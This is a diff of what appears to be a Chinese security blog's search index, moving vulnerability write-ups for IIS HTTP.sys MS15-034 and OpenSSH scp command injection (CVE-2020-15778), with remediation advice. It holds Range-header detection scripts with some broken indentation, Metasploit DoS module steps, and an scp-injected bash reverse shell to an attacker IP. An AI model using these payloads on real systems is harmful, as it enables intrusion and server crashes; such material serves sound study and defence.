+        <tag>高危漏洞</tag>
+        <tag>命令执行漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>jQuery库版本过低</title>
     <url>//c7d50197fdce.html</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer" />
@@ -2222,44 +2324,6 @@
         <tag>跨站类漏洞</tag>
         <tag>中危漏洞</tag>
         <tag>第三方库漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTTP.SYS远程执行代码漏洞(MS15-034)</title>
-    <url>//67bda6fdaf83.html</url>
-    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
-<p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞</p>
-<p>攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>任何安装了微软IIS 6.0以上的</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Win Server 2008 R2</span><br><span class="line">Win Server 2012</span><br><span class="line">Win Server 2012 R2</span><br><span class="line">Win 7</span><br><span class="line">Win 8</span><br><span class="line">Win 8.1</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">使用curl工具检测</button></li><li class="tab"><button type="button" data-href="#-2">使用python3检测域名</button></li><li class="tab"><button type="button" data-href="#-3">使用python3检测IP</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -H &quot;Range: bytes&#x3D;0-18446744073709551615&quot; http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>
-
-<p>如果服务器存在HTTP.SYS远程代码执行漏洞，那么响应状态应该有：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure>
-
-<p>如果服务器打上了补丁，那么响应状态应该是：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP Error 400. The request has an invalid header name.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;;jastra&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bg_colors</span>:</span></span><br><span class="line">    VULN = <span class="string">&#x27;;33[92m&#x27;</span>;</span><br><span class="line">    NONVULN= <span class="string">&#x27;;33[95m&#x27;</span>;</span><br><span class="line">    EXPLOIT = <span class="string">&#x27;;33[91m&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify_iis</span>(<span class="params">domain</span>):</span></span><br><span class="line">    	req = requests.get(<span class="built_in">str</span>(domain))</span><br><span class="line">        remote_server = req.headers[<span class="string">&#x27;server&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Microsoft-IIS&#x27;</span> <span class="keyword">in</span> remote_server:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务是&#x27;</span> + remote_server)</span><br><span class="line">            ms15_034_test(<span class="built_in">str</span>(domain))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务器不是IIS\n可能是: &#x27;</span> + remote_server)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ms15_034_test</span>(<span class="params">domain</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;启动vuln检查!&#x27;</span>)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;stuff&#x27;</span>,<span class="string">&#x27;Range&#x27;</span>: <span class="string">&#x27;bytes=0-18446744073709551615&#x27;</span>&#125;</span><br><span class="line">        req = requests.get(<span class="built_in">str</span>(domain), headers = headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Requested Range Not Satisfiable&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;存在HTTP.sys远程代码执行漏洞!&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">b&#x27;The request has an invalid header name&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;漏洞已修复&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;IIS服务无法显示漏洞是否存在，需要手动检测&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        usr_domain = <span class="built_in">input</span>(<span class="string">&#x27;输入域名扫描: &#x27;</span>)</span><br><span class="line">        identify_iis(usr_domain)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">ipAddr = <span class="string">&quot;IP地址&quot;</span>                         <span class="comment"># 这里填写检测的IP</span></span><br><span class="line">hexAllFfff = <span class="string">&quot;18446744073709551615&quot;</span></span><br><span class="line"></span><br><span class="line">req1 = <span class="string">&quot;GET / HTTP/1.0\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">req = <span class="string">&quot;GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-&quot;</span> + hexAllFfff + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Audit Started&quot;</span>)</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((ipAddr, <span class="number">80</span>))                     <span class="comment"># 可以手动更改端口</span></span><br><span class="line">client_socket.send(req1.encode())</span><br><span class="line">boringResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;Microsoft&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> boringResp:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*] Not IIS&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">    client_socket.close()</span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	client_socket.connect((ipAddr, <span class="number">80</span>))                 <span class="comment"># 可以手动更改端口</span></span><br><span class="line">	client_socket.send(req.encode())</span><br><span class="line">	goodResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;Requested Range Not Satisfiable&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[!!] Looks VULN&quot;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="string">b&quot; The request has an invalid header name&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Looks Patched&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Unexpected response, cannot discern patch status&quot;</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
-
-
-
-<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><p>通过MSF</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">&gt;search ms 15-034</span><br><span class="line">&gt;auxiliary&#x2F;scanner&#x2F;http&#x2F;ms15_034_http_sys_memory_dump      # 检测模块</span><br><span class="line">&gt;auxiliary&#x2F;dos&#x2F;http&#x2F;ms15_034_ulonglongadd                # 攻击模块，可能导致蓝屏</span><br><span class="line">&gt;show options</span><br><span class="line">&gt;set RHOST IP</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.禁用IIS内核缓存</p>
-<p>2.<a href='https://support.microsoft.com/zh-cn/kb/3042553' target='_blank'>官方补丁下载</a></p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>常见漏洞</category>
-      </categories>
-      <tags>
-        <tag>高危漏洞</tag>
-        <tag>命令执行漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -2690,46 +2754,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Openssh命令注入漏洞（CVE-2020-15778）</title>
-    <url>//6d1490659228.html</url>
-    <content><![CDATA[<h2 id="Openssh命令注入漏洞（CVE-2020-15778）"><a href="#Openssh命令注入漏洞（CVE-2020-15778）" class="headerlink" title="Openssh命令注入漏洞（CVE-2020-15778）"></a>Openssh命令注入漏洞（CVE-2020-15778）</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>OpenSSH是用于使用SSH协议进行远程登录的一个开源实现。通过对交互的流量进行加密防止窃听，连接劫持以及其他攻击。OpenSSH由OpenBSD项目的一些开发人员开发， 并以BSD样式的许可证提供，且已被集成到许多商业产品中。</p>
-<p>2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。</p>
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><ul>
-<li>Openssh &gt;= 8.3p1</li>
-</ul>
-<h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><ul>
-<li>Openssh &gt;= 8.3p1</li>
-<li>SSH请求未被防火墙拦截，或者其他原因导致SSH链接失败</li>
-<li>知道SSH密码</li>
-</ul>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -P 22 test.txt root@192.168.1.1:&#39;&#96;pwd&#96; &#x2F;home&#39;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>攻击机</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;攻击机IP 192.168.0.1</span><br><span class="line">nc -lvp 8432</span><br></pre></td></tr></table></figure>
-
-
-
-<p>靶机</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -P 22 test.txt root@192.168.1.1:&#39;&#96;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.1&#x2F;8432 0&gt;&amp;1&#96; &#x2F;home&#x2F;test.txt&#39;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>设置强密码，周期性的更换密码或者密钥</p>
-<p>使用rsync代替scp</p>
-<p>官方暂无补丁</p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>服务器应用漏洞</category>
-        <category>SSH</category>
-      </categories>
-      <tags>
-        <tag>命令注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Elasticsearch未授权访问</title>
     <url>//9db3aff65775.html</url>
     <content><![CDATA[<h2 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​        ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。</p>
@@ -2801,6 +2825,46 @@
       </categories>
       <tags>
         <tag>未授权访问</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Openssh命令注入漏洞（CVE-2020-15778）</title>
+    <url>//6d1490659228.html</url>
+    <content><![CDATA[<h2 id="Openssh命令注入漏洞（CVE-2020-15778）"><a href="#Openssh命令注入漏洞（CVE-2020-15778）" class="headerlink" title="Openssh命令注入漏洞（CVE-2020-15778）"></a>Openssh命令注入漏洞（CVE-2020-15778）</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>OpenSSH是用于使用SSH协议进行远程登录的一个开源实现。通过对交互的流量进行加密防止窃听，连接劫持以及其他攻击。OpenSSH由OpenBSD项目的一些开发人员开发， 并以BSD样式的许可证提供，且已被集成到许多商业产品中。</p>
+<p>2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><ul>
+<li>Openssh &gt;= 8.3p1</li>
+</ul>
+<h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><ul>
+<li>Openssh &gt;= 8.3p1</li>
+<li>SSH请求未被防火墙拦截，或者其他原因导致SSH链接失败</li>
+<li>知道SSH密码</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -P 22 test.txt root@192.168.1.1:&#39;&#96;pwd&#96; &#x2F;home&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>攻击机</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;攻击机IP 192.168.0.1</span><br><span class="line">nc -lvp 8432</span><br></pre></td></tr></table></figure>
+
+
+
+<p>靶机</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -P 22 test.txt root@192.168.1.1:&#39;&#96;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.1&#x2F;8432 0&gt;&amp;1&#96; &#x2F;home&#x2F;test.txt&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>设置强密码，周期性的更换密码或者密钥</p>
+<p>使用rsync代替scp</p>
+<p>官方暂无补丁</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>服务器应用漏洞</category>
+        <category>SSH</category>
+      </categories>
+      <tags>
+        <tag>命令注入</tag>
       </tags>
   </entry>
   <entry>
